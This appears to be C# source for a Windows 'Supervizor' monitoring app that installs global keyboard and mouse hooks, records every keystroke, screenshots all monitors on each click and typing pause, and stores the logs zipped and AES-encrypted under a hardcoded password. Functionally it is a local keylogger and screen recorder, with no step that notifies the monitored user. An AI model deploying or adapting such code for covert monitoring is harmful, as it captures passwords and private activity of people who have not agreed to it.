using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Collections.Generic;
using Microsoft.Win32;
using System.IO.Compression;
using System.Security.Cryptography;
using System.Timers;

namespace ScreenCaptureApp
{    
    [StructLayout(LayoutKind.Sequential)]
    struct KBDLLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    public partial class Supervizor : Form
    {
        private static IntPtr _mouseHookID;
        private static IntPtr _keyboardHookID;
        private static List<Screen> screens = new List<Screen>();
        private static System.Timers.Timer typingTimer = new System.Timers.Timer();
        private static readonly object keyPressLock = new object();
        private static int keyPressCount = 0;
        private static Point lastKeyPressLocation;
        private static string keyPresses = "";
        private static string userName = Environment.UserName;
        private System.Timers.Timer saveTimer;
        public static string baseDirectoryPath = @"C:\images\capture\hist\";
        public static string userLogBaseDirectory = System.IO.Path.Combine(baseDirectoryPath, userName);
        public static string sessionGuid = Guid.NewGuid().ToString(); 
        private static DateTime lastActivityTime;
        private readonly TimeSpan activityThreshold = TimeSpan.FromSeconds(30); 
        public Supervizor()
        {
            InitializeComponent();
            HookGlobalEvents();
            SetupTypingTimer();
            SystemEvents.SessionEnding -= OnSessionEnding;
            SystemEvents.SessionEnded -= OnSessionEnded;
            saveTimer = new System.Timers.Timer(30000);
            saveTimer.Elapsed += OnSaveTimerElapsed;
            saveTimer.Start();
            EnsurePathExists();
            lastActivityTime = DateTime.Now;
        }
        public void EnsurePathExists()
        {
            if (!System.IO.Directory.Exists(userLogBaseDirectory))
            {
                System.IO.Directory.CreateDirectory(userLogBaseDirectory);
            }
        }
        private static void UpdateLastActivityTime()
        {
            lastActivityTime = DateTime.Now;
        }
        private void SetupTypingTimer()
        {
            typingTimer.Interval = 2000; // 2-second delay for typing pause
            typingTimer.Elapsed += OnTypingTimerElapsed;
            typingTimer.AutoReset = false;
            typingTimer.Start();
        }

        private void OnTypingTimerElapsed(object sender, ElapsedEventArgs e)
        {
            lock (keyPressLock)
            {
                if (keyPressCount > 0)
                {
                    string logText = $"{DateTime.Now:yyyy.MM.dd_HH:mm:ss} | Action: {keyPresses} | User: {userName}";
                    CaptureAndLogScreen(logText, "Typing Pause", lastKeyPressLocation);
                    EnsurePathExists();
                    ResetKeyPresses();
                }
            }
        }
        private void OnSaveTimerElapsed(object sender, ElapsedEventArgs e)
        {
            if (DateTime.Now - lastActivityTime < activityThreshold)
            {
                EnsurePathExists();
                ZipSessionFiles();
            }
        }
        private  void OnSessionEnding(object sender, SessionEndingEventArgs e)
        {
            ZipSessionFiles();
            saveTimer.Stop();
            saveTimer.Dispose();
            typingTimer.Dispose();
            Directory.Delete(userLogBaseDirectory, true);
            StopSupervizor();
        }
        private  void OnSessionEnded(object sender, SessionEndedEventArgs e)
        {
            ZipSessionFiles();
            saveTimer.Stop();
            saveTimer.Dispose();
            typingTimer.Dispose();
            Directory.Delete(userLogBaseDirectory, true);
            StopSupervizor();
        }
        private void ZipSessionFiles()
        {
            EnsurePathExists();
            string timestamp = DateTime.Now.ToString("yyyyMMdd_HHmmss");
            string zipFileName = $"{timestamp}_{userName}_{sessionGuid}";
            //DirectoryPath = System.IO.Path.Combine(@"C:\images\capture\hist\", userName);
            ZipFile.CreateFromDirectory(userLogBaseDirectory, System.IO.Path.Combine(baseDirectoryPath, $"{zipFileName}.zip"), CompressionLevel.Optimal, false);
            EncryptZipFile(System.IO.Path.Combine(baseDirectoryPath, $"{zipFileName}.zip"), System.IO.Path.Combine(baseDirectoryPath,$"{zipFileName}.bin"));
            ClearDirectoryContents(userLogBaseDirectory);
            EnsurePathExists();
        }
        private void ClearDirectoryContents(string directoryPath)
        {
            var directory = new DirectoryInfo(directoryPath);

            if (directory.Exists)
            {
                directory.GetFiles().ToList().ForEach(file => file.Delete());
                directory.GetDirectories().ToList().ForEach(dir => dir.Delete(true));
            }
        }

        private void StopSupervizor()
        {
            if (saveTimer != null)
            {
                saveTimer.Stop();
                saveTimer.Dispose();
                ZipSessionFiles();
                Application.Exit();
            }
        }
        private void EncryptZipFile(string inputZipFile, string outputZipFile)
        {
            string password = "MyPassword"; // Use a strong password here
            byte[] salt = GenerateSalt();

            using (FileStream fsInput = new FileStream(inputZipFile, FileMode.Open, FileAccess.Read))
            using (FileStream fsEncrypted = new FileStream(outputZipFile, FileMode.Create, FileAccess.Write))
            {
                fsEncrypted.Write(salt, 0, salt.Length); // Prepend the salt

                using (AesCng aes = new AesCng())
                {
                    aes.KeySize = 256;
                    aes.BlockSize = 128;
                    var key = new Rfc2898DeriveBytes(password, salt, 10000);
                    aes.Key = key.GetBytes(aes.KeySize / 8);
                    aes.IV = key.GetBytes(aes.BlockSize / 8);

                    aes.Padding = PaddingMode.PKCS7;
                    aes.Mode = CipherMode.CFB;

                    using (CryptoStream cs = new CryptoStream(fsEncrypted, aes.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        byte[] buffer = new byte[1048576]; // 1MB buffer size
                        int read;
                        while ((read = fsInput.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            cs.Write(buffer, 0, read);
                        }
                    }
                }
            }
            // Optionally, you can delete the original unencrypted zip file
            File.Delete(inputZipFile);
        }

private byte[] GenerateSalt()
{
    byte[] data = new byte[32]; // 256 bits
    using (var rng = new RNGCryptoServiceProvider())
    {
        rng.GetBytes(data);
    }
    return data;
}


        private void ResetKeyPresses()
        {
            keyPresses = "";
            keyPressCount = 0;
        }

        private static void CaptureAndLogScreen(string logText, string action, Point clickLocation)
        {
            string filePath = CaptureScreen(logText, action, clickLocation);
            _ = LogEventAsync(logText, filePath);
        }
        
        private void HookGlobalEvents()
        {
            _mouseHookID = SetHook(HookCallback, WH_MOUSE_LL);
            _keyboardHookID = SetHook(HookCallback, WH_KEYBOARD_LL);
        }

        private static IntPtr SetHook(LowLevelHookProc proc, int hookType)
        {
            using (var curProcess = Process.GetCurrentProcess())
            using (var curModule = curProcess.MainModule)
            {
                return SetWindowsHookEx(hookType, proc, GetModuleHandle(curModule.ModuleName), 0);
            }
        }

        private delegate IntPtr LowLevelHookProc(int nCode, IntPtr wParam, IntPtr lParam);

        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0)
            {
                HandleMouseAndKeyboardEvents(wParam, lParam);
            }
            return CallNextHookEx(IntPtr.Zero, nCode, wParam, lParam);
        }

        private static void HandleMouseAndKeyboardEvents(IntPtr wParam, IntPtr lParam)
        {
            if (wParam == (IntPtr)WM_LBUTTONDOWN || wParam == (IntPtr)WM_RBUTTONDOWN)
            {
                HandleMouseClick(wParam);
            }
            else if (wParam == (IntPtr)WM_KEYDOWN)
            {
                HandleKeyPress(lParam);
            }
        }

        private static void HandleMouseClick(IntPtr wParam)
        {
            UpdateLastActivityTime();
            string action = wParam == (IntPtr)WM_LBUTTONDOWN ? "L click" : "R click";
            GetCursorPos(out Point clickLocation);
            string logText = $"{DateTime.Now:yyyy.MM.dd_HH:mm:ss} | Action: {action} | User: {userName}";
            CaptureAndLogScreen(logText, action, clickLocation);
        }

        private static void HandleKeyPress(IntPtr lParam)
        {
            UpdateLastActivityTime();
            KBDLLHOOKSTRUCT kb = (KBDLLHOOKSTRUCT)Marshal.PtrToStructure(lParam, typeof(KBDLLHOOKSTRUCT));
            string action = ((Keys)kb.vkCode).ToString();
            lock (keyPressLock)
            {
                keyPresses += action;
                keyPressCount++;
            }
            GetCursorPos(out lastKeyPressLocation); // Capture the cursor position
            typingTimer.Stop();
            typingTimer.Start();
        }

        private static string CaptureScreen(string logText, string action, Point clickLocation)
        {
            Rectangle totalBounds = new Rectangle();
            foreach (Screen screen in Screen.AllScreens)
            {
                totalBounds = Rectangle.Union(totalBounds, screen.Bounds);
            }
            
            //string directoryPath = @"C:\images\capture\hist";

            using (Bitmap bitmap = new Bitmap(totalBounds.Width, totalBounds.Height))
            {
                using (Graphics g = Graphics.FromImage(bitmap))
                {
                    foreach (Screen screen in Screen.AllScreens)
                    {
                        g.CopyFromScreen(screen.Bounds.X, screen.Bounds.Y, screen.Bounds.X - totalBounds.X, screen.Bounds.Y - totalBounds.Y, screen.Bounds.Size);
                    }
                    if (action == "L click" || action == "R click")
                    {
                        using (SolidBrush brush = new SolidBrush(Color.FromArgb(170, 255, 0, 0)))
                        using (Pen greenPen = new Pen(Color.FromArgb(200, 0, 255, 0), 3))
                        using (Pen bluePen = new Pen(Color.FromArgb(255, 0, 0, 255), 3))
                        {
                            g.FillEllipse(brush, new Rectangle((clickLocation.X - totalBounds.X - 10), (clickLocation.Y - totalBounds.Y - 10), 20, 20));
                            g.DrawEllipse(greenPen, new Rectangle((clickLocation.X - totalBounds.X - 20), (clickLocation.Y - totalBounds.Y - 20), 40, 40));
                            g.DrawEllipse(bluePen, new Rectangle((clickLocation.X - totalBounds.X - 30), (clickLocation.Y - totalBounds.Y - 30), 60, 60));
                        }  
                    }
                    using (Font font = new Font("Consolas", 12))
                    using (SolidBrush whiteBrush = new SolidBrush(Color.White))
                    {
                        SizeF textSize = g.MeasureString(logText, font);
                        RectangleF textBackground = new RectangleF(new PointF(10, 10), textSize);
                        using (SolidBrush blackBrush = new SolidBrush(Color.FromArgb(229, 0, 0, 0)))
                            {
                                g.FillRectangle(blackBrush, textBackground);
                            }
                            g.DrawString(logText, font, whiteBrush, new PointF(10, 10));
                    }
                }
                string filePath = System.IO.Path.Combine(userLogBaseDirectory, $"Screenshot_{DateTime.Now:yyyyMMdd_HHmmss}.png");
                bitmap.Save(filePath, ImageFormat.Png);
                return filePath;
            }
        }

        private static async Task LogEventAsync(string logText, string filePath)
        {
            string logEntry = $"{DateTime.Now:yyyy.MM.dd-HH:mm:ss};{logText};{filePath};{userName}";
            string logFilePath = System.IO.Path.Combine(userLogBaseDirectory, "log.txt");

            using (StreamWriter sw = new StreamWriter(logFilePath, true))
            {
                await sw.WriteLineAsync(logEntry);
            }
        }

        protected override void OnFormClosing(FormClosingEventArgs e)
        {
            UnhookWindowsHookEx(_mouseHookID);
            UnhookWindowsHookEx(_keyboardHookID);
            SystemEvents.SessionEnding -= OnSessionEnding;
            SystemEvents.SessionEnded -= OnSessionEnded;
            ZipSessionFiles();
            base.OnFormClosing(e);
        }

        private const int WH_MOUSE_LL = 14;
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_LBUTTONDOWN = 0x0201;
        private const int WM_RBUTTONDOWN = 0x0204;
        private const int WM_KEYDOWN = 0x0100;

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelHookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern bool GetCursorPos(out Point lpPoint);
        
        [DllImport("user32.dll")]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);

        [StructLayout(LayoutKind.Sequential)]
        public struct RECT
        {
            public int Left;
            public int Top;
            public int Right;
            public int Bottom;
        }
    }
}